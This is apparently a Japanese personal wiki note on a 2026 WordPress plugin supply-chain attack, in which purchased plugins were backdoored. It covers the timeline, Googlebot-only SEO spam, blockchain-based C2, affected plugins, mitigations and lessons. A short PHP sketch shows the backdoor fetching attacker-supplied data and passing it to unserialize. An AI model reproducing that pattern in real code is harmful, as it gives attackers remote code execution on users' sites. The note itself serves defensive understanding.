---
type: insight
status: []
tags:
  - security/supply-chain
  - security/web
sources:
  - "https://anchor.host/someone-bought-30-wordpress-plugins-and-planted-a-backdoor-in-all-of-them/"
created: 2026-04-14
updated: 2026-04-14
---

# WordPressプラグインサプライチェーン攻撃（2026年4月）

30以上のWordPressプラグインが買収後に改ざんされ、バックドアが仕込まれた事件。オープンソースエコシステムにおけるサプライチェーンリスクの典型事例。

## 経緯

1. 攻撃者がFlippa（ソフトウェア売買プラットフォーム）で「Essential Plugin」ポートフォリオを購入
2. **2025年8月8日**：悪意のあるコードを静かに仕込む（潜伏期間の開始）
3. **2026年4月**：8ヶ月の潜伏後に攻撃コードを発動
4. WordPress.orgが30以上のプラグインを同時削除

## 技術的詳細

### バックドアの仕組み

```php
// 攻撃者サーバーからデータを取得し、任意の関数を実行
function fetch_ver_info() {
    $data = remote_get($attacker_server);
    @unserialize($data);  // 危険な非シリアライズ
}
```

`wp-config.php`に約6KBのPHPコードを注入し、**Googlebotにのみ**SEOスパムを表示（通常ユーザーからは見えない）。

### C2インフラの高度化

C2（Command & Control）ドメインを**Ethereumスマートコントラクト**で管理。従来の「C2ドメインを無効化する」対応では対処できない。

## 影響を受けた主なプラグイン

- Countdown Timer Ultimate
- Popup Anything on Click
- WP Testimonial with Widget
- Post Grid and Filter Ultimate
- その他多数のスライダー・ギャラリー系プラグイン

## 対応策

| 対策 | 内容 |
|------|------|
| 強制更新 | WordPress.orgがv2.6.9.1で強制適用 |
| パッチ | `wpos-analytics`ディレクトリ全体を削除 |
| フォレンジック | `wp-config.php`のファイルサイズ監視 |

## 根本的な問題

WordPress.orgはプラグインの**所有権変更時の審査メカニズムを持たない**。新しい保守者によるコードレビューも実施されない。これはWordPressに限らず、オープンソースエコシステム全体の課題。

## 教訓

- **所有権変更のリスク**：人気プラグイン・ライブラリの買収後に悪意あるコードが混入するパターンが増加している
- **潜伏期間の長さ**：8ヶ月の潜伏は従来の検出手法では発見が困難
- **ブロックチェーン活用**：攻撃インフラがブロックチェーン上に移行しており、従来の対応が無効化されるリスク

## 関連ページ

- [[wiki/n-day-bench]] — LLMの脆弱性発見能力評価
- [[wiki/lean-formal-verification-limits]] — ソフトウェア検証の限界
